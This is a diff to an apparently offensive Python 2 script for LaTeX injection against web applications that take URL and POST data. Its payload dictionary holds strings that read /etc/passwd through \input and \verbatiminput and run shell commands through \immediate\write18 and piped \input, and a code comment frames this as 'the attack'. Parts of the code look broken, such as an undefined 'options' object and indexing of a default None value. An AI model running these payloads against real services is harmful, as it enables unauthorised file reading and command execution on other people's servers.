@@ -16,17 +16,22 @@ class LatexIncorrectSerial(Exception):
 		I create a specific function
 		for an exception for a reason.
 		'''
-		self.LatexSerial = LatexSerial
+		pass
 
 class LatexArgumentation:
-	def __init__(self, LatexOptionnal=None):
+	def __init__(self, LatexOptionnal=None,
+							PayloadMeasure=None,
+							MeasurePayload=None):
 		'''
 			Creating arguments to
 			do something cool.
 		'''
 		self.URL = options.ArgumentURL
 		self.POST = options.ArgumentPOST
+
 		self.Optionnal = LatexOptionnal
+		self.LowPayload = PayloadMeasure
+		self.SpeedPayload = MeasurePayload
 
 	def StringLT(self):
 		'''
@@ -40,7 +45,7 @@ class LatexArgumentation:
 			if not(StringsPT in self.POST):
 				raise LatexIncorrectSerial("Post-Data crashed !")
 
-	def StringsNT(self):
+	def StringNT(self):
 		'''
 			The attack takes place
 			here with several success.	
@@ -50,18 +55,19 @@ class LatexArgumentation:
 				"\input{/etc/passwd}":False,
 				"\usepackage{verbatim}":False,
 				"\+verbatiminput{/etc/passwd}":False
-				
-		}, "Execution.Measure": {
+
+			}, "Execution.Measure": {
 				"\immediate\write18{cat /etc/passwd}":False,
 				"\input|cat /etc/passwd":False,
 				"\input{|'cat /etc/passwd'}":False
 			}
+
 		}
 
-		print self.Optionnal["Reading.Measure"].keys()
-		print self.Optionnal["Execution.Measure"].keys()
+		self.LowPayload = self.Optionnal["Reading.Measure"].keys()
+		self.SpeedPayload = self.Optionnal["Execution.Measure"].keys()
 
 if __name__ == "__main__":
 	Argument = LatexArgumentation()
 	Argument.StringLT()
-	Argument.StringsNT()
+	Argument.StringNT()
